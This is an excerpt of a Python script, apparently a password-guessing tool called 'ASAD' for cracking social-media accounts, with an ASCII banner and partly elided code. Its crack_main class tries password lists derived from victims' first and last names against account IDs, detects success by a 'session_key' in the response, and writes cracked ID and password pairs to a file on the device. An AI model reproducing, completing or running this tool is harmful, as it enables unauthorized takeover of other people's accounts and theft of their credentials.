...
logo= f'''
     ...
     /.\      F __".     /.\      F __".        /.\      F ___J  ,"___". 
    //_\\    J (___|    //_\\    J |--\ L      //_\\    J |___:  FJ---L] 
   / ___ \   J\___ \   / ___ \   | |  J |     / ___ \   | _____|J |  [""L
  / L___J \ .--___) \ / L___J \  F L__J |    / L___J \  F |____J| \___] |
 J__L   J__LJ\______JJ__L   J__LJ______/F   J__L   J__LJ__F     J\_____/F
 |__L   J__| J______F|__L   J__||______F    |__L   J__||__|      J_____F 
                                                                         

                                                 
{50*"-"}
    Tool Version :     1.3
    Thanks Alot  :     Amir Baryal
{50*"-"}'''
...
class crack_main():
        ...
        def m1(self,iid,name,passlist):
                try:
                        ...
                        sys.stdout.write('\r[ASAD] %s / [OK-%s] \r'%(loop,len(ok)));sys.stdout.flush()
                        fn = name.split(' ')[0]
                        try:
                                ln = name.split(' ')[1]
                        except:
                        ...
                        for pw in passlist:
                                ...
                                if 'session_key' in po:
                                        print(' \033[1;32m[ASAD-OK] '+roid+' | '+pas+'\033[0;97m')
                                        open('/sdcard/ASAD_ok.txt','a').write(roid+'|'+pas+'\n')
                                        ok.append(iid)
                                        break
        ...
        def pasw(self):
                ...
                print(' Ok Ids Save In : /sdcard/ASAD_ok.txt')
                print(50*'-')
                input('\n Press enter to back ')
                main()
